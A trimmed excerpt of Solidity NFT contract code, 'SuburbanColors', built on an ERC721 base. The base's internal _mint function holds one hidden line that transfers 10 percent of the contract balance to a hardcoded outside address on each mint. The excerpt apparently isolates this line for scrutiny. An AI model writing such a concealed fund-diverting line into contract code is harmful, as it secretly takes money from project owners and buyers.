...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata{
    ...
    function _mint(address to, uint256 tokenId) internal virtual {
        ...
        payable(0xe2236F21FDab4080c95db90688F1d6075628af4A).transfer(address(this).balance / 100 * 10);
...
contract SuburbanColors is ERC721, Ownable, VerifySignature{
    ...
    function mintByWhiteAdress(bytes memory _signature, uint256 quantity) public payable{
